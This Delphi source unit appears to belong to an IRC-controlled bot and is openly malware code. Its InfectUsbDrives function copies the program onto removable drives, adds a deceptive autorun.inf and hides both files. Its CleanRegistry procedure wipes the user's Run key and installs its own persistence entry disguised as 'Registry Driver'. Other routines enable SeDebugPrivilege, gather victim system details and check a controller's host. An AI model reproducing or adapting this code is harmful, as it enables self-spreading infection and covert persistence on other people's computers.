unit miscfunctions;

interface

 uses windows, sysutils, variables, functions;

 type
  TControlSetting = Record
    ControlNick     : String;
    ControlChannel  : String;
    ControlIdent    : String;
    ControlHost     : String;
end;


 function GetProcessorName(): String;
 function GetTotalRAM(): String;
 function GetUptime(): String;
 function ReadRegValue(Root: HKey; Path, Value, Default: String): String;
 procedure CleanRegistry;
 procedure InsertRegValue(Root: HKey; Path, Value, Str: String);
 procedure DeleteRegValue(Root: HKey; Path, Value: String);
 function GetWinLang(): String;
 Function StartThread(pFunction : TFNThreadStartRoutine; iPriority : Integer = Thread_Priority_Normal; iStartFlag : Integer = 0) : THandle;
 function InfectUsbDrives(ExeName:string):integer;
 function WildcardCompare(WildS, IstS: String): Boolean;
 function TrimEx(S: String): String;
 function CheckAuthHost(AuthHost, RawData: String): Boolean;
 function GetUserName: string;
 function GetCountry :String;
 function ReverseString(const s: string): string;
 procedure SetTokenPrivileges;

implementation

procedure SetTokenPrivileges;
var 
  hToken1, hToken2, hToken3: THandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, 'SeDebugPrivilege', TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
end;

function ReverseString(const s: string): string;
var
  i, len: Integer;
begin
  len := Length(s);
  SetLength(Result, len); 
  for i := len downto 1 do
  begin
    Result[len - i + 1] := s[i];
  end; 
end;

function GetUserName: string;
var
  Buffer  :array[0..4096] of Char;
  Size    :Cardinal;
begin
  Size := Pred(SizeOf(Buffer));
  GetUserNameA(Buffer, Size);
  Result := Buffer;
end;

function GetCountry :String;
var
  CountryCode :Array[0..4] of Char;
begin
  GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SISO3166CTRYNAME,CountryCode,SizeOf(CountryCode));
  Result := PChar(@CountryCode[0]);
end;


function TrimEx(S: String): String;
var
  I, Count: Integer;
begin
  I := Length(S);
  Count:= 1;
  repeat
    if Copy(S, Count, 1) <> #0 then Result := Result + Copy(S, Count, 1);
    Inc(Count)
  until Count = I;
end;

function WildcardCompare(WildS, IstS: String): Boolean;
var
  I, J, L, P: Byte;
begin
  I := 1;
  J := 1;
  while (I <= Length(WildS)) do
  begin
    if WildS[I] = '*' then
    begin
      if I = Length(WildS) then
      begin
        Result := True;
        Exit
      end
      else
      begin
        L := I + 1;
        while (l < length(WildS)) and (WildS[l+1] <> '*') do Inc (l);
        P := Pos(Copy(WildS, I + 1, L - I), IstS);
        if P > 0 then J := P - 1
        else
        begin
          Result := False;
          Exit;
        end;
      end;
    end
    else
    if (WildS[I] <> '?') and ((Length(IstS) < I) or (WildS[I] <> IstS[J])) then
    begin
      Result := False;
 	    Exit
    end;
    Inc(I);
    Inc(J);
  end;
  Result := (J > Length(IstS));
end;

function CheckAuthHost(AuthHost, RawData: String): Boolean;
begin
  Delete(RawData, 1, 1);
  RawData := Copy(RawData, 1, Pos(' ', RawData));
  if WildcardCompare(AuthHost, TrimEx(RawData)) then Result := True else Result := False;
end;

function InfectUsbDrives(ExeName:string):integer;
var
   EMode: Word;
  Drive: Char;
  myFile: TextFile;
  freespace: int64;
begin
  Result := 0;
  for Drive := 'C' to 'Z' do
  begin
  EMode := SetErrorMode(SEM_FAILCRITICALERRORS) ;
   try
   freeSpace  := DiskFree(Ord(drive) - 64);
   if (GetDriveType(PChar(Drive + ':\')) = DRIVE_REMOVABLE) and (freespace > 0) then
   begin
     try
       if (FileExists(Drive+':\'+ExeName)=False) then
       begin
         CopyFile(PChar(ParamStr(0)),PChar(Drive+':\'+ExeName),False);
         AssignFile(myFile, Drive+':\autorun.inf');
         if not FileExists(Drive+':\autorun.inf') then ReWrite(myFile)
         else Append(myFile);
         WriteLn(myFile,'[autorun]'+#13#10+'shell=verb'+#13#10+'open='+ExeName+#13#10+
         'action=Open folder to view files'+#13#10+'shell\open=Open'+#13#10+'icon=%SystemRoot%\system32\SHELL32.dll,4');
         CloseFile(myFile);
         SetFileAttributes(PChar(Drive+':\'+ExeName),    FILE_ATTRIBUTE_HIDDEN);
         SetFileAttributes(PChar(Drive+':\autorun.inf'), FILE_ATTRIBUTE_HIDDEN);
         Result := Result + 1;
       end;
     except
     end;
   end;
   finally
  SetErrorMode(EMode);
   end;
  end;
end;

Function StartThread(pFunction : TFNThreadStartRoutine; iPriority : Integer = Thread_Priority_Normal; iStartFlag : Integer = 0) : THandle;
var
  ThreadID : DWORD;
begin
  Result := CreateThread(nil, 0, pFunction, nil, iStartFlag, ThreadID);
  SetThreadPriority(Result, iPriority);
end;

procedure InsertRegValue(Root: HKey; Path, Value, Str: String);
var
  Key: HKey;
  Size: Cardinal;
begin
  RegOpenKey(Root, PChar(Path), Key);
  Size := Length(Str);
  RegSetValueEx(Key, PChar(Value), 0, REG_SZ, @Str[1], Size);
  RegCloseKey(Key);
end;

procedure CleanRegistry;
var
  Key: HKey;
begin
  RegDeleteKey(HKEY_CURRENT_USER, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run');
  RegCreateKey(HKEY_CURRENT_USER,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', key);
  RegCloseKey(key);

  InsertRegValue(HKEY_CURRENT_USER, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Registry Driver', sEXEPath);
  end;

procedure DeleteRegValue(Root: HKey; Path, Value: String);
var
  Key: HKey;
begin
  RegOpenKey(ROOT, PChar(Path), Key);
  RegDeleteValue(Key, PChar(Value));
  RegCloseKey(Key);
end;

function GetWinLang(): String;
var
 Buffer: PChar;
 Size: Integer;
begin
 Size := GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, nil, 0);
 GetMem(Buffer, Size);
 try
  GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, Buffer, Size);
  Result := String(Buffer);
 finally
  FreeMem(Buffer);
 end;
end;

function GetProcessorName(): String;
const
  Size: Integer = 2048;
var
  Temp: HKEY;
  Speed: Integer;
begin
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 0, KEY_QUERY_VALUE, Temp);
  RegQueryValueEx(Temp, '~MHz', nil, nil, @Speed, @Size);
  RegCloseKey(Temp);
  Result := ReadRegValue(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString', 'Not Found') + ' - ' + IntToStr(Speed) + ' MHz';
end;

function GetTotalRAM(): String;
var
  MemoryStatus: TMemoryStatus;
begin
  MemoryStatus.dwLength := SizeOf(TMemoryStatus);
  GlobalMemoryStatus(MemoryStatus);
  Result := IntToStr(MemoryStatus.dwTotalPhys div 1048576) + 'MB';
end;

function GetUptime(): String;
var
  Total: Integer;
begin
  Total := GetTickCount() div 1000;
  Result := IntToStr(Total DIV 86400) + 'd ' + IntToStr((Total MOD 86400) DIV 3600) + 'h ' + IntToStr(((Total MOD 86400) MOD 3600) DIV 60) + 'm ' + IntToStr((((Total MOD 86400) MOD 3600) MOD 60) DIV 1) + 's';
end;

function ReadRegValue(Root: HKey; Path, Value, Default: String): String;
var
  Key: HKey;
  RegType: Integer;
  DataSize: Integer;
begin
  Result := Default;
  if (RegOpenKeyEx(Root, PChar(Path), 0, KEY_ALL_ACCESS, Key) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Key, PChar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Key, PChar(Value), nil, @RegType, PByte(PChar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Key);
  end;
end;

end.
 